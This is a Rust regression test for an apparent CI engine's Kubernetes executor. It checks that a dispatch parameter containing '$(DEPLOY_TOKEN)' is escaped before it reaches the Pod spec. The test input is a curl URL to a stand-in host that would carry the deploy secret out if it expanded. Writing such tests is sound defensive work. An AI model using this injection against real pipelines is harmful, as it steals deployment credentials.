//! A launch parameter holding `$(NAME)` must reach the Pod as text.
//!
//! Kubernetes expands `$(VAR)` in a container's `command`, `args` and
//! `env[].value` from that container's environment, and Step secrets are plain
//! env vars. So a dispatch parameter `https://example.invalid/?t=$(DEPLOY_TOKEN)`
//! rendered into `[curl, "${{ inputs.url }}"]` would become the secret before
//! `curl` ever ran, with no shell involved.
//!
//! This drives the whole launch path that exists without a cluster: frozen Run
//! params → the scheduler's render → `K8sExecutor::launch` → the Pod it POSTs
//! to a fake API server. The assertion is on the bytes Kubernetes would have
//! received. Hermetic: no cluster, no Postgres.

use std::sync::{Arc, Mutex};

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::routing::{get, post};
use axum::{Json, Router};
use serde_json::{json, Value};

use scarab_engine::{Clock, Db, RunId, Scheduler, StepId, StepSpec, Timestamp};
use scarab_executor_k8s::K8sExecutor;
use scarab_testkit::{FakeClock, InMemoryDb};

const NS: &str = "scarab-test";

type Created = Arc<Mutex<Vec<Value>>>;

/// The two calls a first launch makes: "does the Pod exist" (no) and "create
/// it" (recorded, echoed back as the API server does).
async fn fake_api() -> (String, Created) {
    let created: Created = Arc::default();
    let app = Router::new()
        .route(
            "/api/v1/namespaces/{ns}/pods/{name}",
            get(|Path((_ns, name)): Path<(String, String)>| async move {
                (
                    StatusCode::NOT_FOUND,
                    Json(json!({
                        "kind": "Status", "apiVersion": "v1", "metadata": {},
                        "status": "Failure", "reason": "NotFound", "code": 404,
                        "message": format!("pods \"{name}\" not found"),
                    })),
                )
            }),
        )
        .route(
            "/api/v1/namespaces/{ns}/pods",
            post(
                |State(created): State<Created>, Json(pod): Json<Value>| async move {
                    created.lock().unwrap().push(pod.clone());
                    (StatusCode::CREATED, Json(pod))
                },
            ),
        )
        .with_state(created.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (format!("http://{addr}"), created)
}

fn curl_spec() -> StepSpec {
    StepSpec {
        image: "curlimages/curl".into(),
        command: vec!["curl".into(), "${{ inputs.url }}".into()],
        env: vec![],
        secrets: vec![],
        run_as_root: false,
        add_capabilities: vec![],
        privileged: false,
        timeout_seconds: None,
        workspace_inputs: vec![],
        workspace_outputs: vec![],
        cache: None,
        clone: None,
        build: None,
        artifacts: vec![],
        placement_profiles: vec![],
        resources: Default::default(),
        k8s_overlay: None,
        oidc_token: None,
        services: Vec::new(),
        uses: Vec::new(),
        matrix_values: Default::default(),
    }
}

#[tokio::test]
async fn a_param_naming_a_secret_reaches_the_pod_escaped() {
    // kube's client config builds a rustls connector even for plain http, and
    // this test graph links more than one CryptoProvider (git-bug 2852828).
    let _ = rustls::crypto::ring::default_provider().install_default();
    let (url, created) = fake_api().await;
    let config = kube::Config::new(url.parse().unwrap());
    let client = kube::Client::try_from(config).expect("kube client");
    let exec = K8sExecutor::with_client(NS, client);

    let db = InMemoryDb::new();
    let clock = FakeClock::new(1_000);
    let run = RunId("r1".into());
    let step = StepId("fetch".into());
    db.create_run(&run, 1, 1, Timestamp(1_000)).await.unwrap();
    let params = std::collections::BTreeMap::from([(
        "url".to_string(),
        json!("https://example.invalid/?t=$(DEPLOY_TOKEN)"),
    )]);
    db.set_run_params(&run, &params).await.unwrap();
    db.create_step_run(&run, &step, Some(&curl_spec()), &[], Timestamp(1_000))
        .await
        .unwrap();

    Scheduler::new(&db as &dyn Db, &clock as &dyn Clock, &exec, "sched-1")
        .tick(&run)
        .await
        .unwrap();

    let pods = created.lock().unwrap().clone();
    assert_eq!(pods.len(), 1, "exactly one Pod created: {pods:#?}");
    let container = &pods[0]["spec"]["containers"][0];
    assert_eq!(
        container["command"],
        json!(["curl", "https://example.invalid/?t=$$(DEPLOY_TOKEN)"]),
        "Kubernetes reduces `$$` to `$`, so curl receives the URL as rendered"
    );
    // The same value rides in as `SCARAB_PARAM_URL`; env values expand too.
    let param_env = container["env"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["name"] == "SCARAB_PARAM_URL")
        .expect("SCARAB_PARAM_URL is set");
    assert_eq!(
        param_env["value"],
        json!("https://example.invalid/?t=$$(DEPLOY_TOKEN)")
    );
}
